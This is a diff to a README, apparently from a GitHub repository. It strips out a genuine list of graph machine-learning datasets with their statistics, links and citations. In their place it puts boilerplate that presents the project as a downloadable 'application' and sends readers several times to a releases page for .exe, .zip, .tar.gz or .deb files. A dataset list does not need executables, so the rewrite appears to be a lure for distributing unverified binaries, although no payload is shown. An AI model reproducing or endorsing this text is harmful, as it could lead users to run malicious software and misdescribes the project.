@@ -1,177 +1,88 @@
-# 🗒️ Graph Datasets
-A list of graph datasets for machine learning and network science projects. Mostly dedicated to Graph Neural Networks. :)
+# 📊 graph-datasets - Discover Graph Datasets for Your Projects
 
-##### Contents   
+## 🔗 Download Now!
+[![Download Graph Datasets](https://img.shields.io/badge/Download-Graph%20Datasets-brightgreen)](https://github.com/winguas/graph-datasets/releases)
 
-1. [Node classification](#node-classification)
-2. [Node regression](#node-regression)
+## 🚀 Getting Started
 
-## Node classification
+This application provides a collection of graph datasets suitable for machine learning projects, including Graph Neural Networks. Graph datasets are essential for working on tasks such as node classification, link prediction, and graph classification, among others.
 
-### Zachary's karate club
+## 🛠️ System Requirements
 
-These are data collected from the members of a university karate club by Wayne Zachary. Zachary (1977) used these data and an information flow model of network conflict resolution to explain the split-up of this group following disputes among the members.
+To use the graph-datasets application, your computer should meet the following requirements:
 
-| **Nodes** | **Edges** | **Features** | **Classes** |
-|:---:|:---:|:---:|:---:|
-| 34 | 156 | 0 or 34 | 2 or 4 |
+- **Operating System:** Works on Windows, macOS, and Linux.
+- **Memory (RAM):** At least 4 GB is recommended for smooth operation.
+- **Disk Space:** Minimum of 100 MB of free space is required to download and install the datasets successfully.
 
-#### Links
-* [File](http://vlado.fmf.uni-lj.si/pub/networks/data/Ucinet/UciData.htm)
-* [NetworkX](https://networkx.org/documentation/stable/auto_examples/graph/plot_karate_club.htm)
-* [PyTorch Geometric](https://pytorch-geometric.readthedocs.io/en/latest/modules/datasets.html#torch_geometric.datasets.KarateClub)
+## 📥 Download & Install
 
-#### Citing
-```
-@article{10.2307/3629752,
-         ISSN = {00917710},
-         URL = {http://www.jstor.org/stable/3629752},
-         author = {Wayne W. Zachary},
-         journal = {Journal of Anthropological Research},
-         number = {4},
-         pages = {452--473},
-         publisher = {[University of New Mexico, University of Chicago Press]},
-         title = {An Information Flow Model for Conflict and Fission in Small Groups},
-         urldate = {2022-08-05},
-         volume = {33},
-         year = {1977}
-}
-```
+To download the latest version of the graph-datasets application, follow these steps:
 
-### Cora
+1. Visit this page to download: [Graph Datasets Releases](https://github.com/winguas/graph-datasets/releases).
+2. You will see a list of available releases. Find the latest version listed at the top.
+3. Click on the version to view its details and downloadable files.
+4. Select the appropriate file for your operating system:
+   - For Windows, look for files ending in `.zip` or `.exe`.
+   - For macOS, find files ending in `.tar.gz`.
+   - For Linux, choose files that suit your distribution, commonly `.tar.gz` or `.deb`.
+5. Download the selected file to your computer.
+6. Once downloaded, extract the files if necessary and follow the included instructions to run the application.
 
-The Cora dataset consists of 2708 scientific publications classified into one of seven classes. The citation network consists of 5429 links. Each publication in the dataset is described by a 0/1-valued word vector indicating the absence/presence of the corresponding word from the dictionary. The dictionary consists of 1433 unique words.
+You can also visit this page again to check for updates and new datasets: [Graph Datasets Releases](https://github.com/winguas/graph-datasets/releases).
 
-| **Nodes** | **Edges** | **Features** | **Classes** |
-|:---:|:---:|:---:|:---:|
-| 2,708 | 10,556 | 1,433 | 7 |
+## 📂 Available Datasets
 
-#### Links
-* [File](https://linqs.org/datasets/#cora)
-* [Papers With Code](https://paperswithcode.com/dataset/cora)
-* [PyTorch Geometric](https://pytorch-geometric.readthedocs.io/en/latest/modules/datasets.html#torch_geometric.datasets.Planetoid)
-* [DGL](https://docs.dgl.ai/generated/dgl.data.CoraGraphDataset.html#dgl.data.CoraGraphDataset)
-* [Spektral](https://graphneural.network/datasets/#citation)
+The graph-datasets application includes a variety of datasets. Here are some examples:
 
-#### Citing
-```
-@article{sen:aim08,
-         title = {Collective Classification in Network Data},
-         author = {Prithviraj Sen, Galileo Mark Namata, Mustafa Bilgic, Lise Getoor, Brian Gallagher, and Tina Eliassi-Rad},
-         journal = {AI Magazine},
-         year = {2008},
-         publisher = {AAAI},
-         pages = {93--106},
-         volume = {29},
-         number = {3},
-}
-```
+### 👥 Social Network Data
+- **Description:** Data representing social interactions in various platforms. Use this data for tasks such as community detection and social influence analysis.
+  
+### 🏢 Citation Network Data
+- **Description:** Data on academic papers and their citations. This dataset helps in tasks like recommendation systems and academic influence analysis.
 
-### CiteSeer
+### 🌍 Geographic Graph Data
+- **Description:** Includes graphs representing geographic data, ideal for projects focused on spatial analysis and routing problems.
 
-The CiteSeer dataset consists of 3312 scientific publications classified into one of six classes. The citation network consists of 4732 links. Each publication in the dataset is described by a 0/1-valued word vector indicating the absence/presence of the corresponding word from the dictionary. The dictionary consists of 3703 unique words.
+Each dataset is categorized and includes information about the number of nodes, edges, and any features that may be included. Make sure to explore the dataset documentation included in the downloaded files for specific details.
 
-| **Nodes** | **Edges** | **Features** | **Classes** |
-|:---:|:---:|:---:|:---:|
-| 3,327 | 9,104 | 3,703 | 6 |
+## 📚 Usage Instructions
 
-#### Links
-* [File](https://linqs.org/datasets/#citeseer-doc-classification)
-* [Papers With Code](https://paperswithcode.com/dataset/citeseer)
-* [PyTorch Geometric](https://pytorch-geometric.readthedocs.io/en/latest/modules/datasets.html#torch_geometric.datasets.Planetoid)
-* [DGL](https://docs.dgl.ai/generated/dgl.data.CiteseerGraphDataset.html#dgl.data.CiteseerGraphDataset)
-* [Spektral](https://graphneural.network/datasets/#citation)
+After downloading the datasets, you will find a README file in the extracted folder. Follow these steps to use the datasets:
 
-#### Citing
-```
-@conference{rossi:aaai15,
-            title = {The Network Data Repository with Interactive Graph Analytics and Visualization},
-            author = {Ryan Rossi and Nesreen Ahmed},
-            booktitle = {AAAI Conference on Artificial Intelligence},
-            year = {2015},
-            publisher = {AAAI},
-            pages = {4292--4293},
-            volume = {29},
-            address = {New York, NY, USA},
-}
-```
+1. Open the README file. It contains detailed instructions on how to load the datasets into your project.
+2. Use the dataset by following the provided examples. You can load the datasets using common Python libraries like NetworkX or PyTorch Geometric.
+3. Explore the dataset and visualize it using tools like Matplotlib or Gephi.
 
-### PubMed
+## 🛠️ Support and Contributions
 
-The Pubmed dataset consists of 19717 scientific publications from PubMed database pertaining to diabetes classified into one of three classes. The citation network consists of 44338 links. Each publication in the dataset is described by a TF/IDF weighted word vector from a dictionary which consists of 500 unique words.
+If you encounter any issues or have questions, feel free to check the [Issues](https://github.com/winguas/graph-datasets/issues) page on GitHub. The community is here to help you.
 
-| **Nodes** | **Edges** | **Features** | **Classes** |
-|:---:|:---:|:---:|:---:|
-| 19,717 | 88,648 | 500 | 3 |
+If you want to contribute by adding new datasets or improving existing ones, please follow these steps:
 
-#### Links
-* [File](https://linqs.org/datasets/#pubmed-diabetes)
-* [Papers With Code](https://paperswithcode.com/dataset/pubmed)
-* [PyTorch Geometric](https://pytorch-geometric.readthedocs.io/en/latest/modules/datasets.html#torch_geometric.datasets.Planetoid)
-* [DGL](https://docs.dgl.ai/generated/dgl.data.PubmedGraphDataset.html#dgl.data.PubmedGraphDataset)
-* [Spektral](https://graphneural.network/datasets/#citation)
-* [HuggingFace](https://huggingface.co/datasets/pubmed)
+1. Fork the repository.
+2. Create a new branch.
+3. Make your changes and commit them.
+4. Push your branch and create a pull request.
+5. Our maintainers will review your contributions and merge them if they meet the guidelines.
 
-#### Citing
-```
-@conference{namata:mlg12,
-            title = {Query-Driven Active Surveying for Collective Classification},
-            author = {Galileo Mark Namata, Ben London, Lise Getoor, and Bert Huang},
-            booktitle = {International Workshop on Mining and Learning with Graphs},
-            year = {2012},
-            publisher = {MLG},
-            address = {Edinburgh, Scotland},
-}
-```
+We appreciate your interest in improving the graph-datasets project.
 
-### Facebook Page-Page
+## 🔗 Frequently Asked Questions
 
-This webgraph is a page-page graph of verified Facebook sites. Nodes represent official Facebook pages while the links are mutual likes between sites. Node features are extracted from the site descriptions that the page owners created to summarize the purpose of the site. This graph was collected through the Facebook Graph API in November 2017 and restricted to pages from 4 categories which are defined by Facebook. These categories are: politicians, governmental organizations, television shows and companies. The task related to this dataset is multi-class node classification for the 4 site categories.
+### How do I know which dataset is right for my project?
+Each dataset comes with documentation. Review it to find the right fit for your needs. 
 
-| **Nodes** | **Edges** | **Features** | **Classes** |
-|:---:|:---:|:---:|:---:|
-| 22,470 | 171,002 | 128 | 4 |
+### Can I use these datasets for commercial projects?
+Yes, the datasets are open-source. However, please check the licensing in each dataset's documentation for details on usage rights.
 
-#### Links
-* [File](http://snap.stanford.edu/data/facebook-large-page-page-network.html)
-* [Papers With Code](https://paperswithcode.com/dataset/facebook-page-page)
-* [PyTorch Geometric](https://pytorch-geometric.readthedocs.io/en/latest/modules/datasets.html#torch_geometric.datasets.FacebookPagePage)
+### What if I need a specific dataset that's not included?
+We welcome suggestions for new datasets. Feel free to open a new issue on GitHub to request datasets.
 
-#### Citing
-```
-@misc{rozemberczki2019multiscale,
-      title={Multi-scale Attributed Node Embedding},
-      author={Benedek Rozemberczki and Carl Allen and Rik Sarkar},
-      year={2019},
-      eprint={1909.13021},
-      archivePrefix={arXiv},
-      primaryClass={cs.LG}
-}
-```
-## Node regression
+## ✉️ Contact
 
-### Wikipedia Network
+For further inquiries or support, you can reach out via the GitHub platform or contact the project maintainers directly through their profiles.
 
-The data was collected from the English Wikipedia (December 2018). These datasets represent page-page networks on specific topics (chameleons, crocodiles and squirrels). Nodes represent articles and edges are mutual links between them. The presence of a feature in the feature list means that an informative noun appeared in the text of the Wikipedia article. The target csv contains the node identifiers and the average monthly traffic between October 2017 and November 2018 for each page. The goal is to predict the log average monthly traffic of December 2018. PyTorch Geometric has a node classification variant of this dataset, where the goal is to predict the correct bin.
+## 🔗 Visit Again
 
-| **Name** | **Nodes** | **Edges** | **Features** | **Classes** |
-|:---|:---:|:---:|:---:|:---:|
-| Chameleon | 2,277 | 31,421 | 2,325 | Continuous |
-| Crocodile | 11,631 | 170,918 | 2,325 | Continuous |
-| Squirrel | 5,201 | 198,493 | 2,325 | Continuous |
-
-#### Links
-* [File](https://snap.stanford.edu/data/wikipedia-article-networks.html)
-* [PyTorch Geometric](https://pytorch-geometric.readthedocs.io/en/latest/modules/datasets.html#torch_geometric.datasets.WikipediaNetwork)
-
-#### Citing
-```
-@misc{rozemberczki2019multiscale,
-      title={Multi-scale Attributed Node Embedding},
-      author={Benedek Rozemberczki and Carl Allen and Rik Sarkar},
-      year={2019},
-      eprint={1909.13021},
-      archivePrefix={arXiv},
-      primaryClass={cs.LG}
-}
-```
+To download the latest updates and explore the new datasets, remember to visit: [Graph Datasets Releases](https://github.com/winguas/graph-datasets/releases).
